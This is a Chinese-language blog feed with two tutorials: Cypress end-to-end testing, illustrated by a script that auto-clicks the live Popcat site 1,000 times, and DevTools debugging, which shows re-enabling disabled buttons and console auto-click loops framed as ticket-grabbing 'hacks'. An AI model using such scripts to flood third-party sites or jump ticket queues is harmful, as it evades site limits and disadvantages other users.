class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&quot;react-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&quot;./App&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> sum <span class="keyword">from</span> <span class="string">&quot;./sum&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;測試群組一&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;sums numbers&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">expect</span>(<span class="title function_">sum</span>(<span class="number">1</span>, <span class="number">2</span>)).<span class="title function_">toEqual</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="title function_">expect</span>(<span class="title function_">sum</span>(<span class="number">2</span>, <span class="number">2</span>)).<span class="title function_">toEqual</span>(<span class="number">4</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;renders without crashing&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, div);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="E2E-測試"><a href="#E2E-測試" class="headerlink" title="E2E 測試"></a>E2E 測試</h2><p>Cypress 提供針對測試的配置、撰寫、執行、除錯完整的 end-to-end test 的解決方案，比較特別的是 Cypress 也像 Redux 的專案一樣提供了時空旅行的功能，並且提供了方便的介面讓我們更容易去針對測試進行除錯。</p><p>這次就用貓貓點擊大賽參戰的範例來帶大家超快速入門，來看看怎麼讓機器來取代 Popcat 的人工點擊!!!</p><p>原始碼: <a href="https://github.dev/LinYenCheng/popcat-cypress">https://github.dev/LinYenCheng/popcat-cypress</a></p><p>Cypress 在使用上其實也很簡單，只要透過簡單的安裝設定就能夠直接執行並撰寫測試了，不一定要測試自己開發的網站，針對網路上的任何站台都能夠執行測試腳本。</p><h3 id="Cypress-安裝設定"><a href="#Cypress-安裝設定" class="headerlink" title="Cypress 安裝設定"></a>Cypress 安裝設定</h3><p>如果是 npm 的專案</p><p><code>npm install cypress --save-dev</code></p><p>首先要設定 npm script</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;popcat&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cypress open&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;test-one&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cypress run --spec **/popcat.spec.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>安裝完完並設定之後，雖然專案資料夾都是全空的，但其實就可以執行了，這時候 Cypress 會偵測到我們是第一次執行，會自動將相關配置及範例加入。</p><blockquote><p>第一次執行 <code>cypress open</code><br><img src="/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/firstTimeUseCypress.png" alt="firstTime"></p></blockquote><p>接著 Cypress 會自動加入相關預設的資料夾配置如下</p><ul><li>fixtures: 存放假資料或是常數值</li><li>integration: 測試撰寫的地方</li><li>plugins: 沒有想要修改預設功能一般不會用到</li><li>support<ul><li>commands: 擴充共用的函式可以統一放在這邊</li></ul></li></ul><blockquote><p>第一次啟動後的畫面<br><img src="/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/cypressTestExamples.png" alt="sampleTest"></p></blockquote><p>此外其實若想修改預設配置，也可以透過設定 <code>cypress.json</code> 來達到相關效果，底下是基本的範例可以看出我們能多設定像是重試次數、影片錄製等等參數，設定檔相關說明可以參考<a href="https://docs.cypress.io/guides/references/configuration">設定檔的參考文件</a>。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;viewportWidth&quot;</span><span class="punctuation">:</span> <span class="number">411</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;viewportHeight&quot;</span><span class="punctuation">:</span> <span class="number">731</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultCommandTimeout&quot;</span><span class="punctuation">:</span> <span class="number">8000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;requestTimeout&quot;</span><span class="punctuation">:</span> <span class="number">8000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;retries&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;video&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;videoUploadOnPasses&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;chromeWebSecurity&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reporter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;junit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ignoreTestFiles&quot;</span><span class="punctuation">:</span> <span class="string">&quot;**/examples/*.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reporterOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;mochaFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;results/TEST-[hash].xml&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Cypress-測試撰寫"><a href="#Cypress-測試撰寫" class="headerlink" title="Cypress 測試撰寫"></a>Cypress 測試撰寫</h3><p>Popcat 貓貓點擊大賽參戰確認!!! 一個最簡單的測試腳本如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">context</span>(<span class="string">&quot;popcat.spec&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">beforeEach</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Cypress</span>.<span class="title function_">on</span>(<span class="string">&quot;uncaught:exception&quot;</span>, <span class="function">(<span class="params">err, runnable</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    cy.<span class="title function_">visit</span>(<span class="string">&quot;https://popcat.click/&quot;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">describe</span>(<span class="string">&quot;貓貓點擊大賽&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;點 1000 下&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title class_">Array</span>(<span class="number">1000</span>)</span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;val&quot;</span>)</span><br><span class="line">        .<span class="title function_">forEach</span>(<span class="function">(<span class="params">elm, index</span>) =&gt;</span> &#123;</span><br><span class="line">          cy.<span class="title function_">wait</span>(<span class="number">100</span> * ((index % <span class="number">5</span>) + <span class="number">1</span>));</span><br><span class="line">          cy.<span class="title function_">get</span>(<span class="string">&quot;.cat-img&quot;</span>).<span class="title function_">click</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>Cypress visit(): <code>cy.visit()</code> 模擬瀏覽器開啟網站</li><li>Cypress wait(): <code>cy.wait()</code> 模擬等待</li><li>Cypress get(): <code>cy.get()</code> 類似 jQuery 的選擇器，可以協助我們找出網頁元素</li></ul><p>學前端這麼多年，第一次覺得派上用場 😅 在台灣，每秒鐘都有上萬隻貓正在張開嘴巴。</p><blockquote><p><img src="/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/popcat70k.JPG" alt="popcat70k"></p></blockquote><ol><li>分析 DOM</li></ol><p>這個部分其實就會使用到 Chrome 的開發者元件，透過檢視，我們可以發現主要的網站很單純沒有太多設計，我們就只要針對 <code>.cat-img</code> 這個 class 進行模擬點擊就可以了，甚至是沒有針對直接對整個網頁觸發鍵盤事件也會有效果。</p><ol start="2"><li>觸發事件</li></ol><p>參戰最簡單的方法其實就是透過 console 來執行，不過這次是想透過測試工具 XD 至於<a href="https://linyencheng.github.io/2018/12/04/tool-google-developer/?utm_source=link&utm_medium=article&utm_campaign=internal_link">如何使用 Chrome 開發者工具</a>歡迎參考之前寫過的文章，相信可以快速入門的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> <span class="title class_">KeyboardEvent</span>(<span class="string">&quot;keydown&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">key</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">  <span class="attr">ctrlKey</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">dispatchEvent</span>(event);</span><br><span class="line">&#125;, <span class="number">500</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>觀察 API</li></ol><p>可以發現是 API 主要步驟有兩個</p><ul><li>透過 reload 來換 token</li><li>累積次數一陣子後透過 POP 這個 API 集中將累積次數 (pop_count) 送到後端</li></ul><blockquote><p>相關 API<br><img src="/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/chromeDevToolNetworkTab.JPG" alt="chromeDevToolNetworkTab"></p></blockquote><p>如果短時間打太頻繁其實也是會被阻擋:</p><blockquote><p>提醒大家運動家精神 XD<br><img src="/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/429.JPG" alt="TooManyRequest"></p></blockquote><p>重複的執行也是會得到 403 的錯誤，這時候需要把整個測試關掉重開。</p><blockquote><p><img src="/2022/10/13/relationships-between-frontend-and-backend/js-web-testing/403.JPG" alt="403"></p></blockquote><h3 id="Cypress-in-Linux-with-Xvfb"><a href="#Cypress-in-Linux-with-Xvfb" class="headerlink" title="Cypress in Linux with Xvfb"></a>Cypress in Linux with Xvfb</h3><p>CI&#x2F;CD 在 Linux 環境上執行 Cypress 時會需要先安裝 Xvfb 但在執行上有時候會遇到問題，可以透過以下指令排解。</p><ul><li>ps -ef | grep Xvfb</li><li>ps -ef | grep Xvfb | grep -v grep | awk ‘{print $2}’ | xargs kill -9</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack 網頁從按鈕開始!HTML/CSS/JS Debug 技巧</title>
      <link href="/2022/10/12/relationships-between-frontend-and-backend/tool-web-developer-debug/"/>
      <url>/2022/10/12/relationships-between-frontend-and-backend/tool-web-developer-debug/</url>
      
        <content type="html"><![CDATA[<p>從搶票按鈕談怎麼使用開發人員工具來 Debug&#x2F;Hack 你的網頁，並且介紹網頁開發中 HTML&#x2F;CSS&#x2F;JavaScript&#x2F;API Debug 技巧與方法。</p><h2 id="什麼是-Debug"><a href="#什麼是-Debug" class="headerlink" title="什麼是 Debug"></a>什麼是 Debug</h2><p>人與人之間的溝通總是最難的課題，處理事情很多時候都在處理人的問題，人跟人之間的溝通只能靠努力。</p><p>程式語言也是溝通的一種，只是溝通的對象是機器，而瀏覽器的開發者工具是開發者跟瀏覽器之間的溝通的工具，透過 Debug Tool 去觀察程式碼的運行狀態和找出錯誤。</p><p>Debug 是找到程式碼錯誤的過程，錯誤可區分為兩種類型</p><ul><li>語法錯誤: 會讓程式無法運行</li><li>邏輯錯誤: 程式能夠運行，但結果不如預期</li></ul><h2 id="開發者工具"><a href="#開發者工具" class="headerlink" title="開發者工具"></a>開發者工具</h2><p>開啟網頁開發者工具的方式非常簡單，在開啟網頁後鍵盤按下以下快捷鍵</p><ul><li><code>f12</code></li><li><code>Ctrl + Shift + i</code></li></ul><p>在開啟開發人員工具後常用幾個 幫助我們進行網頁的 Debug&#x2F;Hack 的 Tab</p><ul><li>元素檢視: 協助 HTML 與 CSS 相關</li><li>網路相關: 處理 API 的 request 以及 response</li><li>Console: JavaScript 相關</li></ul><blockquote><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Debugging_CSS/inspecting1.png"><br>圖片來源: <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Debugging_CSS">https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Debugging_CSS</a></p></blockquote><h3 id="HTML-Debug"><a href="#HTML-Debug" class="headerlink" title="HTML Debug"></a>HTML Debug</h3><p>開發靜態網頁時，可能會遇到下面的問題：</p><ol><li>存完檔後就需要重新整理頁面來看結果。</li><li>資源檔路徑的設定可能在 local 和 server 上有差異。</li></ol><p>解決方案就是在開發時：</p><ol><li>使用 <a href="https://www.npmjs.com/package/livereload">livereload</a> 及他的 <a href="https://chrome.google.com/webstore/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei?hl=zh-TW">chrome 外掛</a>。</li><li>使用 Chrome 提供的 <a href="https://chrome.google.com/webstore/detail/web-server-for-chrome/ofhbbkphhbklhfoeikjpcbhemlocgigb">Web Server</a>。</li></ol><p>另外在還不熟悉 HTML 語法時，會出現預期以外的情形，但 HTML 本身沒有語法錯誤，只是顯示出來可能不是想像中的樣子。</p><p>附上一段 MDN 給的範例，可以</p><ol><li>將範例貼到這個網站 <a href="https://validator.w3.org/">https://validator.w3.org/</a></li><li>將 <a href="https://linyencheng.github.io/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/">VS code 安裝相關外掛</a>協助提示以及撰寫</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>HTML debugging examples<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>What causes errors in HTML?</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Unclosed elements: If an element is <span class="tag">&lt;<span class="name">strong</span>&gt;</span>not closed properly,</span><br><span class="line">      then its effect can spread to areas you didn&#x27;t intend</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Badly nested elements: Nesting elements properly is also very important</span><br><span class="line">      for code behaving correctly. <span class="tag">&lt;<span class="name">strong</span>&gt;</span>strong <span class="tag">&lt;<span class="name">em</span>&gt;</span>strong emphasized?<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">      what is this?<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Unclosed attributes: Another common source of HTML problems. Let&#x27;s</span><br><span class="line">      look at an example: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mozilla.org/&gt;link to Mozilla</span></span></span><br><span class="line"><span class="string"><span class="tag">      homepage&lt;/a&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/ul&gt;</span></span></span><br></pre></td></tr></table></figure><p>比較進階的用法是使用元素檢視器，選中元素之後針對該元素 html tag 按右鍵，就會發現也太多神奇的功能了，這邊就交給大家自行探索 XD</p><ul><li>編輯或加入屬性</li><li>編輯 HTML</li><li>複製元素</li><li>刪除元素</li><li>複製元素的內容，像是樣式、選擇器等等</li></ul><blockquote><p><img src="https://linyencheng.github.io/2022/10/12/relationships-between-frontend-and-backend/tool-web-developer-debug/Element.JPG"><br>元素檢視器</p></blockquote><h3 id="CSS-Debug"><a href="#CSS-Debug" class="headerlink" title="CSS Debug"></a>CSS Debug</h3><p>在開發者工具中，針對規則可以直接修改值也可以新增屬性，瀏覽器也都會自動提示，馬上改馬上生效可以說是非常方便。</p><p>當然在開始前要先搞清楚什麼是 <a href="https://linyencheng.github.io/2022/09/06/relationships-between-frontend-and-backend/css-introduction/#CSS-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B-Box-Model">Box Model 和基本的 CSS 基本概念</a>。</p><blockquote><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Debugging_CSS/inspecting2-color-picker.png"><br>圖片來源: <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Debugging_CSS">https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Debugging_CSS</a></p></blockquote><p>在樣式檔的開發上：</p><ol><li>按 F12 開啟開發者工具之後，打開之後 Elements 這個 tab 就可以讓我們看到所有針對這個樣式的設定，包含 <a href="https://linyencheng.github.io/2022/09/06/relationships-between-frontend-and-backend/css-introduction/#CSS-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B-Box-Model">Box modal 的示意圖</a>，在用戶端就可以透過直接修改來看更動效果。</li><li>按 F12 開啟開發者工具之後，使用模擬器模擬各種裝置大小。</li><li>按 F12 開啟開發者工具之後，手機開啟開發者模式，使用 Chrome 開發者工具的 remote devices，就可以使用手機的 chrome 去 Debug。</li><li>防呆上，也建議使用<a href="https://linyencheng.github.io/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/">編輯器的相關外掛</a>像是 Sass Lint，可以幫我們避開不少問題。</li></ol><p>相關的 CSS rule，可以看到套用在這個元素上的很多設定值，其中:</p><ul><li>權重高的會蓋掉低的</li><li>後面寫的也會蓋掉前面寫的</li><li>瀏覽器不支援的寫了也沒用</li></ul><p>擔心語法錯誤的話一樣可以使用驗證器: <a href="https://jigsaw.w3.org/css-validator/">https://jigsaw.w3.org/css-validator/</a></p><h3 id="API-Debug"><a href="#API-Debug" class="headerlink" title="API Debug"></a>API Debug</h3><p>前端在發<a href="https://linyencheng.github.io/2022/09/22/relationships-between-frontend-and-backend/js-http-client-with-ajax/">非同步請求</a>時通常會使用到 Promise，在實作時記得加上 catch，否則少數狀況會 <code>Uncaught (in promise)</code>。</p><p>那在實作上 Postman 是個方便的好工具，可以先測試 API 是否正常，真的遇到問題時，如果是 node.js 撰寫的後端，在瀏覽器中輸入 <code>about://inspect</code>，我們就可以使用瀏覽器來看伺服器的 log，介面會比較友善一些。</p><p>再來就是資料的確認，這時候推薦可以使用線上的 JSON Formatter and Validator。</p><p>網頁部分會需要開發者工具中的 Network，我們就可以看到伺服器回覆的狀態碼以及 Response，然後針對相關狀態及回應進行處理，底下是相關代碼的簡易分類：</p><ol><li>200 成功</li><li>4XX 用戶端的問題</li><li>5XX 伺服器端的問題</li></ol><p>開發者工具 Network Tab</p><ul><li>狀態欄位：前端正常可以接到 timeout 的訊息，但如果前端攻城獅沒有做例外處理的話，原則上你就會只看到瀏覽器正在載入中，圈圈瘋狂旋轉。打開其中 network 的頁籤，可以看到有一個狀態欄位，我們可以從這裡來做初步的判斷，看到 500 或 timeout 的話，就可以直接再按一次了。<ol><li>200 代表沒有問題</li><li>4XX 使用者端</li><li>5XX 伺服器端</li></ol></li><li>流量分析，我們也可以透過這裡 Size 觀察到相關的流量變化，在網站載入速度過慢時，這裡會是很好的觀察點。</li></ul><p><img src="https://linyencheng.github.io/2022/10/12/relationships-between-frontend-and-backend/tool-web-developer-debug/network.png" alt="network"></p><h3 id="JavaScript-Debug"><a href="#JavaScript-Debug" class="headerlink" title="JavaScript Debug"></a>JavaScript Debug</h3><p>打開 f12 後最常用的就是 Console，而 JavaScript 是直譯的程式語言可以透過 console 來下指令，譬如直接打 <code>console.log(&#39;hello&#39;)</code> 按下 <code>enter</code> 後就會執行。這樣的特性使我們需注意盡量不要使用或產生 Global 變數，避免覆蓋的問題。</p><p>若我們是有使用到 webpack，在除錯的時候就可以善用<code>process.env.NODE_ENV === &#39;development&#39;</code>，透過這樣的判斷，可以在開發的狀態時，預先加入特殊條件及預設值，可以減少許多人工重複的部分。</p><p>另外透過在 Debug 的時候善用 <code>console</code> 留下紀錄並搭配<a href="https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/debugger"><code>debugger;</code> 指令</a> 來執行瀏覽器上可用的除錯功能（一般為中斷點）。</p><ol><li>console.log() 記錄</li><li>console.error() 顯示錯誤紅色</li><li>console.info() 顯示資訊</li><li>console.warn() 顯示警告黃色</li><li>console.clear() 清除 console</li><li>console.time() + console.timeEnd() 計算範圍內的物件耗費間</li><li>console.table() 適用陣列的內容</li></ol><p>想要在 production 的時候自動隱藏 <code>console.log</code> 內容的話，建議可以先封裝，然後針對環境去做進一步的控制。另外不想一直重新整理的話，hot reload 就很重要：</p><ol><li>瀏覽器端：目前只要是使用主流的框架或是函式庫都會幫我們配置好</li><li>伺服器端：需要使用 <code>nodemon</code> 這樣的工具，並在執行的時候告訴工具監看檔案的變化 <code>nodemon --watch ./src/* server.js</code></li></ol><p>編輯器也建議使用<a href="https://linyencheng.github.io/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/">編輯器的相關外掛</a>，特別是 ESLint (eslint-plugin-react 及 eslint-plugin-react-hooks)，React 開發者，可以使用官方文件中 error boundaries 的概念，一來不會讓整個網頁掛掉，二來可以在發生錯誤時，將相關資訊送回後端記錄，另外在 production 環境因為通常會進行<a href="https://developer.mozilla.org/zh-TW/docs/Tools/Debugger/How_to/Pretty-print_a_minified_file">程式碼的壓縮及醜化</a>，所以若是需要在 Production 環境中偵錯的話，要記得一併輸出 .map 檔。</p><h2 id="網頁實作範例"><a href="#網頁實作範例" class="headerlink" title="網頁實作範例"></a>網頁實作範例</h2><p>常常就會發現，按鈕不能按怎麼辦？</p><p>通常有按鈕又不能按就是被 disable 了，所以可以用開發者工具中的左上角，那個框框包住的小箭頭，按下去我們就可以任意選擇畫面中的任何元素。</p><p>輸入框跟按鈕都是可以透過元素的屬性去進行開啟或停用，所以如果想要破解的話，就是看看按鈕有沒有這個屬性??? 有的話恭喜你，對著 disabled 點兩下然後刪除他，然後就發現可以按了。</p><p>先開記事本貼上下面一段，另存成自己覺得很酷炫的名字，下拉式記得選所有檔案，副檔名用 html 我就是存成 demo.html。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Button hack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;click&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">disabled</span></span></span><br><span class="line"><span class="tag">      <span class="attr">onclick</span>=<span class="string">&quot;(function()&#123;console.log(&#x27;click!!!&#x27;); return false;&#125;)();return false;&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      Button I want to click</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接著就可以直接用瀏覽器打開，會看到一個不能按的按鈕，這時候可以按看看，看 console 裡面有沒有出現文字，當然沒有。</p><p>照著上面說的試一次看看，有就是成功了!!! 接著如果又剛好看到傻呼呼按鈕上綁了一個 ID ，這次又恭喜你!!!</p><p>這時候只要複製下面這行:</p><p><code>document.getElementById(&#39;click&#39;).click();</code></p><p>複製後到 console 執行，這次範例的 id 是 click 所以執行後會發現，這樣就等同於我們手按的效果。</p><p>可是這樣只有執行一次我想狂點怎麼辦? 也很簡單只要像下面這樣就會每 500ms 幫你自動點一次按鈕。</p><p>當然如果遇到高竿一點的前端攻城獅，這些可能就無效 QQ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> hack = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  count += <span class="number">1</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;click&quot;</span>).<span class="title function_">click</span>();</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">10</span>) <span class="built_in">clearInterval</span>(hack);</span><br><span class="line">&#125;, <span class="number">500</span>);</span><br></pre></td></tr></table></figure><blockquote><p>以下附上動圖支援 xddd<br><img 